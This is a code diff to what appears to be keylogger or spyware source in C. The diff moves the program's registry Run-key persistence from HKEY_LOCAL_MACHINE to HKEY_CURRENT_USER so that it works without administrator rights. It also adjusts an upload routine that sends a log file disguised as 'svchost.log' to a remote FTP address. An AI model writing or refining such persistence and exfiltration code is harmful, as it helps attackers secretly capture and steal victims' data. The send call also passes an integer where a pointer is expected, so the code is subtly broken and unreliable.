@@ -51,7 +51,7 @@ int create_key(char *path){
 	int reg_key;
 	int check;
 	HKEY hkey;
-	reg_key=RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);		//create the reg key on secified ath
+	reg_key=RegCreateKey(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);		//create the reg key on secified ath
 
 	if(reg_key==0)
 	   {
@@ -72,7 +72,7 @@ int test_key(void ){
 	DWORD buf_length=BUFSIZE;		                        //unsigned integer
 	int reg_key;
 
-	reg_key=RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_QUERY_VALUE,&hKey);       //open the specified registry key
+	reg_key=RegOpenKeyEx(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_QUERY_VALUE,&hKey);       //open the specified registry key
 	if(reg_key!=0){
 		check=1;
 		return check;
@@ -292,9 +292,9 @@ void upload(){
 	create_conn(sock,ftp_ip,port);
 	fp=fopen("svchost.log","r");
 	fseek(fp, 0L, SEEK_END);
-	int sz=ftell(fp);
+	size_t sz=ftell(fp);
 	rewind(fp);
-	send(sock, sz, sizeof(int),0);
+	send(sock, sz, sizeof(sz),0);
 	while((symbol=getc(fp))!=EOF){
 		send(sock, &symbol, sizeof(char),0);
 	}
